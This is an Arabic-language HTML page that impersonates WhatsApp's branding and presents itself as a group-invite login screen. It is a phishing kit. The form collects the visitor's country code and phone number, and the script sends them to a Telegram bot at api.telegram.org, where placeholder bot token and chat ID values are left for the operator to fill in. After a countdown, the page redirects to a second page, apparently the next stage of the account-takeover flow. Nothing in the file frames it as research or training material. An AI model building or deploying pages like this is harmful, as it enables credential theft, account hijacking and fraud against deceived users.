<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://your-image-link.jpg">
    <meta property="og:title" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب. اضغط على الرابط للانضمام.">
    <meta property="og:url" content="https://your-link-to-group.com">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <title>الدعوة للانضمام إلى مجموعة واتساب</title>
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #FAF3E7;
            margin: 0;
            padding: 0;
            transition: background-color 0.3s, color 0.3s;
        }

        body.dark-mode {
            background-color: #333;
            color: #fff;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #25D366;
            padding: 10px 20px;
            color: white;
            font-size: 18px;
        }

        .container {
            text-align: center;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            max-width: 400px;
            margin: 50px auto;
            transition: background-color 0.3s, color 0.3s;
        }

        .container.dark-mode {
            background-color: #444;
            color: #ddd;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
        }

        select, input, button {
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 10px;
            font-size: 14px;
            width: 100%;
            max-width: 300px;
        }

        button {
            background-color: #25D366;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #1DA955;
        }

        footer {
            text-align: center;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }

        @media screen and (max-width: 600px) {
            .container {
                width: 90%;
                padding: 10px;
            }

            .navbar {
                font-size: 14px;
            }
        }
    </style>
</head>

<body>
    <div class="navbar">
        <div>WhatsApp</div>
        <button onclick="toggleDarkMode()">الوضع الليلي</button>
    </div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <div>تسجيل الدخول</div>
        <div>الدعوة للانضمام إلى مجموعة واتساب.</div>

        <div class="form-group">
            <select id="countryCode">
                <option value="966">🇸🇦 السعودية +966</option>
                <option value="971">🇦🇪 الإمارات +971</option>
                <option value="965">🇰🇼 الكويت +965</option>
                <option value="974">🇶🇦 قطر +974</option>
                <option value="973">🇧🇭 البحرين +973</option>
                <option value="968">🇴🇲 عمان +968</option>
                <option value="963">🇸🇾 سوريا +963</option>
                <option value="964">🇮🇶 العراق +964</option>
                <option value="962">🇯🇴 الأردن +962</option>
                <option value="970">🇵🇸 فلسطين +970</option>
                <option value="249">🇸🇩 السودان +249</option>
            </select>
            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
        </div>
        <button onclick="sendMessage()">متابعة</button>
        <div id="loader" style="display: none;">جاري الإرسال...</div>
        <div id="countdown"></div>
    </div>

    <footer>©️ 2024 واتساب</footer>

    <script>
        function toggleDarkMode() {
            document.body.classList.toggle('dark-mode');
            document.querySelector('.container').classList.toggle('dark-mode');
        }

        function sendMessage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();

            const phoneRegex = /^[0-9]{6,14}$/;
            if (!phoneRegex.test(phoneNumber)) {
                Swal.fire({ icon: 'error', title: 'خطأ', text: 'يرجى إدخال رقم هاتف صالح.' });
                return;
            }

            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
            document.getElementById('loader').style.display = 'block';

            fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: 'YOUR_CHAT_ID', text: `رقم الهاتف: ${fullPhoneNumber}` })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                if (data.ok) {
                    startCountdown();
                } else {
                    Swal.fire({ icon: 'error', title: 'خطأ', text: 'حدث خطأ أثناء الإرسال.' });
                }
            })
            .catch(() => {
                document.getElementById('loader').style.display = 'none';
                Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل الاتصال بالخادم.' });
            });
        }

        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            let countdown = 10;

            const interval = setInterval(() => {
                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
                countdown--;

                if (countdown < 0) {
                    clearInterval(interval);
                    window.location.href = 'secondpage.html';
                }
            }, 1000);
        }
    </script>
</body>
</html>
